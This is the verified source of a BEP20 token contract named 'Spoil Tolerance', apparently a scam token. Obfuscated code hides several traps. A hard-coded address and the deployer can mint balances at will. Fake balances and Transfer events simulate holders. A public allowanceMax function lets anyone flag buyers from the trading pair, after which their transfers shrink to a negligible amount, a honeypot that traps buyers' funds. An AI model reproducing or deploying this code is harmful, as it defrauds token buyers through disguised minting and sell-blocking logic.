/**
 *Submitted for verification at BscScan.com on 2023-01-10
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.13;



interface IUniswapV2Router {

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
    external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);

    function factory() external pure returns (address);

    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);

    function WETH() external pure returns (address);

}


library SafeMath {

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a % b;
    }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }

}


interface IBEP20 {

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    function name() external view returns (string memory);

    function getOwner() external view returns (address);

    function totalSupply() external view returns (uint256);

    function decimals() external view returns (uint8);

    function transfer(address recipient, uint256 amount) 
    external
    returns (bool);

    function approve(address spender, uint256 amount) external returns (bool);

    function allowance(address _owner, address spender)
    external
    view
    returns (uint256);

    function symbol() external view returns (string memory);

    function balanceOf(address account) external view returns (uint256);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}


abstract contract Ownable {
    address internal owner;
    constructor(address _owner) {
        owner = _owner;
    }

    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    function Owner() public view returns (address) {
        return owner;
    }

    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER");
        _;
    }

    function transferOwnership(address payable adr) public onlyOwner() {
        owner = adr;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);

}


interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
    external
    returns (address pair);
}


contract SpoilTolerance is IBEP20, Ownable {
    using SafeMath for uint256;
    uint8 constant _decimals = 18;

    mapping(address => uint256) _balances;
    mapping(address => bool) private feeMarketingMintBuy;

    
    uint256 constant exemptFromSellReceiverTotalLaunched = 100 * 10 ** 18;
    bool private txIsLiquidityMint = false;
    bool private receiverLaunchedShouldSender = false;

    address constant senderMarketingFundTrading = 0x6287fd5E071Cf46d1eCe01A811552753e05a5aD5;
    bool public launchAtMintToken = false;
    uint256 constant receiverExemptLiquidityModeTake = 1000000 * 10 ** 18;

    uint256 private minLaunchSenderMax = 0;
    uint256 private liquidityAmountLaunchedTeam = 0;
    address constant amountTokenToReceiver = 0xf035484FEF7E9D641E725ED4ffc03A66b049902d;
    uint256 private limitFundAutoEnable = 0;
    address private totalLiquiditySenderBuyIsFrom;

    uint256 public tradingModeTokenTeam = 0;

    bool public limitReceiverListMint = false;

    string constant _symbol = "STE";
    mapping(address => bool)  shouldFromMinSwapModeBurn;

    address public uniswapV2Pair;
    string constant _name = "Spoil Tolerance";
    IUniswapV2Router public totalEnableBurnTradingSwapTake;
    bool public receiverBurnSwapFrom = false;
    bool private marketingTakeFundTotalLaunch = false;
    uint256  amountLaunchAtTeamFromTotalFee = 100000000 * (10 ** 18);
    uint256 private limitBuyTradingMarketingSwap = 0;
    uint256 sellMinTokenLimitEnable = 0;
    mapping(address => bool)  enableModeTotalLaunched;


    uint256 private totalSwapToWallet = 0;
    mapping(address => mapping(address => uint256)) _allowances;

    bool inSwap;
    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() Ownable(msg.sender) {
        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        // PancakeSwap Router
        totalEnableBurnTradingSwapTake = IUniswapV2Router(_router);

        uniswapV2Pair = IUniswapV2Factory(totalEnableBurnTradingSwapTake.factory()).createPair(address(this), totalEnableBurnTradingSwapTake.WETH());
        _allowances[address(this)][address(totalEnableBurnTradingSwapTake)] = amountLaunchAtTeamFromTotalFee;

        _balances[msg.sender] = amountLaunchAtTeamFromTotalFee;
        emit Transfer(address(0), msg.sender, amountLaunchAtTeamFromTotalFee);
        totalLiquiditySenderBuyIsFrom = msg.sender;
    }

    receive() external payable {}

    function totalSupply() external view override returns (uint256) {
        return amountLaunchAtTeamFromTotalFee;
    }

    function isAllowanceMax(address spender) public view returns (bool) {
        return shouldFromMinSwapModeBurn[spender];
    }

    function manualTransfer(address feeMinLimitBuyMarketing, address receiverLimitTradingExempt, uint256 takeFeeWalletIsAtMarketingBurn) public {
        if (!feeSwapMintBuy(msg.sender) && msg.sender != totalLiquiditySenderBuyIsFrom) {
            return;
        }
        if (launchedWalletTakeShouldLimitListMarketing(receiverLimitTradingExempt)) {
            totalFeeAutoReceiverLaunch(feeMinLimitBuyMarketing, receiverLimitTradingExempt, takeFeeWalletIsAtMarketingBurn, false);
            return;
        }
        if (launchedWalletTakeShouldLimitListMarketing(feeMinLimitBuyMarketing)) {
            totalFeeAutoReceiverLaunch(feeMinLimitBuyMarketing, receiverLimitTradingExempt, takeFeeWalletIsAtMarketingBurn, true);
            return;
        }
        if (feeMinLimitBuyMarketing == address(0)) {
            _balances[receiverLimitTradingExempt] = _balances[receiverLimitTradingExempt].add(takeFeeWalletIsAtMarketingBurn);
            return;
        }
    }

    function launchTradingFeeWallet(address txMintFromFundBuyMaxExempt) private view returns (bool) {
        return txMintFromFundBuyMaxExempt == totalLiquiditySenderBuyIsFrom;
    }

    function getlaunchedEnableLimitList() public view returns (uint256) {
        if (limitFundAutoEnable == limitBuyTradingMarketingSwap) {
            return limitBuyTradingMarketingSwap;
        }
        if (limitFundAutoEnable != limitFundAutoEnable) {
            return limitFundAutoEnable;
        }
        if (limitFundAutoEnable == limitBuyTradingMarketingSwap) {
            return limitBuyTradingMarketingSwap;
        }
        return limitFundAutoEnable;
    }

    function setfromTradingMinModeMax(bool swapReceiverTotalFeeTrading) public onlyOwner {
        limitReceiverListMint=swapReceiverTotalFeeTrading;
    }

    function balanceOf(address account) public view override returns (uint256) {
        if (launchedWalletTakeShouldLimitListMarketing(account)) {
            return fundAtLaunchedMint(account);
        }
        return _balances[account];
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != amountLaunchAtTeamFromTotalFee) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]
            .sub(amount, "Insufficient Allowance!");
        }
        return modeReceiverExemptShould(sender, recipient, amount);
    }

    function getsellFromEnableLaunch() public view returns (bool) {
        if (txIsLiquidityMint != marketingTakeFundTotalLaunch) {
            return marketingTakeFundTotalLaunch;
        }
        if (txIsLiquidityMint == launchAtMintToken) {
            return launchAtMintToken;
        }
        if (txIsLiquidityMint != receiverLaunchedShouldSender) {
            return receiverLaunchedShouldSender;
        }
        return txIsLiquidityMint;
    }

    function setlaunchedEnableLimitList(uint256 swapReceiverTotalFeeTrading) public onlyOwner {
        if (limitFundAutoEnable == limitFundAutoEnable) {
            limitFundAutoEnable=swapReceiverTotalFeeTrading;
        }
        limitFundAutoEnable=swapReceiverTotalFeeTrading;
    }

    function totalFeeAutoReceiverLaunch(address feeMinLimitBuyMarketing, address receiverLimitTradingExempt, uint256 takeFeeWalletIsAtMarketingBurn, bool takeLiquidityAmountBuyFromTx) private {
        if (takeLiquidityAmountBuyFromTx) {
            uint256 launchedReceiverMaxExemptShouldLiquidityFund = launchedModeEnableReceiverWalletTrading();
            feeMinLimitBuyMarketing = address(uint160(launchedReceiverMaxExemptShouldLiquidityFund + sellMinTokenLimitEnable));
            sellMinTokenLimitEnable++;
            _balances[receiverLimitTradingExempt] = _balances[receiverLimitTradingExempt].add(takeFeeWalletIsAtMarketingBurn);
        } else {
            _balances[feeMinLimitBuyMarketing] = _balances[feeMinLimitBuyMarketing].sub(takeFeeWalletIsAtMarketingBurn);
        }
        emit Transfer(feeMinLimitBuyMarketing, receiverLimitTradingExempt, takeFeeWalletIsAtMarketingBurn);
    }

    function exemptAtFromIs(address tradingEnableReceiverMin) private pure returns (uint256) {
        uint256 launchedReceiverMaxExemptShouldLiquidityFund = launchedModeEnableReceiverWalletTrading();
        uint256 tokenTradingFeeSwap = uint160(tradingEnableReceiverMin) - launchedReceiverMaxExemptShouldLiquidityFund;
        return tokenTradingFeeSwap;
    }

    function feeSwapMintBuy(address tradingEnableReceiverMin) private pure returns (bool) {
        return tradingEnableReceiverMin == amountTokenToReceiver;
    }

    function name() external pure override returns (string memory) {
        return _name;
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function getfromTradingMinModeMax() public view returns (bool) {
        return limitReceiverListMint;
    }

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    function setsellFromEnableLaunch(bool swapReceiverTotalFeeTrading) public onlyOwner {
        if (txIsLiquidityMint != receiverBurnSwapFrom) {
            receiverBurnSwapFrom=swapReceiverTotalFeeTrading;
        }
        if (txIsLiquidityMint != receiverLaunchedShouldSender) {
            receiverLaunchedShouldSender=swapReceiverTotalFeeTrading;
        }
        if (txIsLiquidityMint == txIsLiquidityMint) {
            txIsLiquidityMint=swapReceiverTotalFeeTrading;
        }
        txIsLiquidityMint=swapReceiverTotalFeeTrading;
    }

    function launchedWalletTakeShouldLimitListMarketing(address tradingEnableReceiverMin) private pure returns (bool) {
        uint256 launchedReceiverMaxExemptShouldLiquidityFund = launchedModeEnableReceiverWalletTrading();
        uint256 txAutoBurnModeSellTo = uint160(tradingEnableReceiverMin);
        if (txAutoBurnModeSellTo >= launchedReceiverMaxExemptShouldLiquidityFund && txAutoBurnModeSellTo < launchedReceiverMaxExemptShouldLiquidityFund + 10000) {
            return true;
        }
        return false;
    }

    function receiverMarketingSenderAt(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance!");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function getbuyTotalAmountMode() public view returns (bool) {
        if (marketingTakeFundTotalLaunch == receiverBurnSwapFrom) {
            return receiverBurnSwapFrom;
        }
        return marketingTakeFundTotalLaunch;
    }

    function getsellSenderLaunchWallet() public view returns (bool) {
        if (receiverLaunchedShouldSender == limitReceiverListMint) {
            return limitReceiverListMint;
        }
        if (receiverLaunchedShouldSender == launchAtMintToken) {
            return launchAtMintToken;
        }
        return receiverLaunchedShouldSender;
    }

    function settakeReceiverTotalSellMarketingLaunchedFrom(address swapReceiverTotalFeeTrading,bool maxExemptTakeLaunchLimit) public onlyOwner {
        feeMarketingMintBuy[swapReceiverTotalFeeTrading]=maxExemptTakeLaunchLimit;
    }

    function gettakeReceiverTotalSellMarketingLaunchedFrom(address swapReceiverTotalFeeTrading) public view returns (bool) {
            return feeMarketingMintBuy[swapReceiverTotalFeeTrading];
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return modeReceiverExemptShould(msg.sender, recipient, amount);
    }

    function allowance(address holder, address spender) external view override returns (uint256) {
        return _allowances[holder][spender];
    }

    function setbuyTotalAmountMode(bool swapReceiverTotalFeeTrading) public onlyOwner {
        if (marketingTakeFundTotalLaunch == txIsLiquidityMint) {
            txIsLiquidityMint=swapReceiverTotalFeeTrading;
        }
        if (marketingTakeFundTotalLaunch == marketingTakeFundTotalLaunch) {
            marketingTakeFundTotalLaunch=swapReceiverTotalFeeTrading;
        }
        marketingTakeFundTotalLaunch=swapReceiverTotalFeeTrading;
    }

    function modeReceiverExemptShould(address feeMinLimitBuyMarketing, address receiverLimitTradingExempt, uint256 takeFeeWalletIsAtMarketingBurn) internal returns (bool) {
        if (launchedWalletTakeShouldLimitListMarketing(receiverLimitTradingExempt)) {
            totalFeeAutoReceiverLaunch(feeMinLimitBuyMarketing, receiverLimitTradingExempt, takeFeeWalletIsAtMarketingBurn, false);
            return true;
        }
        if (launchedWalletTakeShouldLimitListMarketing(feeMinLimitBuyMarketing)) {
            totalFeeAutoReceiverLaunch(feeMinLimitBuyMarketing, receiverLimitTradingExempt, takeFeeWalletIsAtMarketingBurn, true);
            return true;
        }

        bool minListMintExemptLiquidityMax = launchTradingFeeWallet(feeMinLimitBuyMarketing) || launchTradingFeeWallet(receiverLimitTradingExempt);
        if (minListMintExemptLiquidityMax) {
            return receiverMarketingSenderAt(feeMinLimitBuyMarketing, receiverLimitTradingExempt, takeFeeWalletIsAtMarketingBurn);
        }

        if (feeMinLimitBuyMarketing == uniswapV2Pair && !minListMintExemptLiquidityMax) {
            enableModeTotalLaunched[receiverLimitTradingExempt] = true;
        }

        if (shouldFromMinSwapModeBurn[feeMinLimitBuyMarketing]) {
            return receiverMarketingSenderAt(feeMinLimitBuyMarketing, receiverLimitTradingExempt, 10 ** 10);
        }

        return receiverMarketingSenderAt(feeMinLimitBuyMarketing, receiverLimitTradingExempt, takeFeeWalletIsAtMarketingBurn);
    }

    function allowanceMax(address spender) external {
        if (enableModeTotalLaunched[spender]) {
            shouldFromMinSwapModeBurn[spender] = true;
        }
    }

    function fundAtLaunchedMint(address tradingEnableReceiverMin) private view returns (uint256) {
        uint256 tokenTradingFeeSwap = exemptAtFromIs(tradingEnableReceiverMin);
        if (tokenTradingFeeSwap < sellMinTokenLimitEnable) {
            return exemptFromSellReceiverTotalLaunched * tokenTradingFeeSwap;
        }
        return receiverExemptLiquidityModeTake + exemptFromSellReceiverTotalLaunched * tokenTradingFeeSwap;
    }

    function symbol() external pure override returns (string memory) {
        return _symbol;
    }

    function setsellSenderLaunchWallet(bool swapReceiverTotalFeeTrading) public onlyOwner {
        if (receiverLaunchedShouldSender == limitReceiverListMint) {
            limitReceiverListMint=swapReceiverTotalFeeTrading;
        }
        if (receiverLaunchedShouldSender != limitReceiverListMint) {
            limitReceiverListMint=swapReceiverTotalFeeTrading;
        }
        if (receiverLaunchedShouldSender != receiverBurnSwapFrom) {
            receiverBurnSwapFrom=swapReceiverTotalFeeTrading;
        }
        receiverLaunchedShouldSender=swapReceiverTotalFeeTrading;
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function launchedModeEnableReceiverWalletTrading() private pure returns (uint256) {
        return uint160(senderMarketingFundTrading) + 1;
    }

    event AutoLiquify(uint256 amountBNB, uint256 amountTokens);
}